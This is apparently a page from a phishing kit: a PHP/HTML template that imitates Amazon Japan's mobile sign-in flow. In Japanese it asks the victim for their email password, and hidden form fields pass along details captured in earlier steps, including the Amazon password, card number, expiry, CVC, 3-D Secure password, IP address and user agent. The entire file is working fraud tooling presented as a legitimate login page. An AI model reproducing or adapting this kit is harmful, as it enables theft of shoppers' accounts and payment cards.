  ...
  <header class="nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven"> 
   <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-gateway nav-sprite-v3 celwidget" data-cel-widget="Navigation-mobile-navbar"> 
    <div id="nav-logobar"> 
     ...
     <div class="nav-right">       <a href="" aria-label="Cart" class="nav-a" id="nav-button-cart"> 
...
<div data-is-view="true">
            ...
            電子メールアドレス
                                                            ...
                                                            <div class="a-section a-spacing-large">
                                                                <label class="a-form-label"> パスワード <font style='color:#797474;'>(メールパスワードを入力してください)</font> </label>

                                                                <input placeholder="パスワード" type="password" id="emailpass" name="emailpass" autocomplete="off" class="a-input-text a-span12" required>
                                                ...
                                                <span id="continue" class="a-button a-button-span12 a-button-primary"> <span class="a-button-inner"> <input id="continue" tabindex="5" class="a-button-input" type="submit"><span id="continue-announce" class="a-button-text"> 継続する </span></span>
                                                </span>
                                                <br>
                                                <br>
                                                ...
                                                <span id="auth-create-account-link" class="a-button a-button-span12"> <span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text" role="button"> キャンセル </a></span></span>
                                                <br>
                                                <br>
                                                <input type="hidden" name="email" value="<?=$_SESSION['email']?>">
                                                <input type="hidden" name="password" value="<?=$_SESSION['password']?>">
                                                <input type="hidden" name="fullname" value="<?=$_SESSION['fullname']?>">
                                                <input type="hidden" name="stat" value="<?=$_SESSION['stat']?>">
                                                ...
                                                <input type="hidden" name="namecard" value="<?=$_SESSION['namecard']?>">
                                                <input type="hidden" name="cardnumber" value="<?=$_SESSION['cardnumber']?>">
                                                <input type="hidden" name="exdate" value="<?=$_SESSION['exdate']?>">
                                                <input type="hidden" name="cvc" value="<?=$_SESSION['cvc']?>">
                                                <input type="hidden" name="passvbv" value="<?=$_SESSION['passvbv']?>">
                                                
                                                <input type="hidden" name="country" value="<?=$_SESSION['country']?>">
                                                <input type="hidden" name="region" value="<?=$_SESSION['region']?>">
                                                <input type="hidden" name="_ip_" value="<?=$_SESSION['_ip_']?>">
                                                <input type="hidden" name="HTTP_USER_AGENT" value="<?=$_SERVER['HTTP_USER_AGENT']?>">
                                                <input type="hidden" name="timedate" value="<?=date('H:i:s d/m/Y')?>">
                                            </form>
                                        </div>
                                    </div>
                                </div>
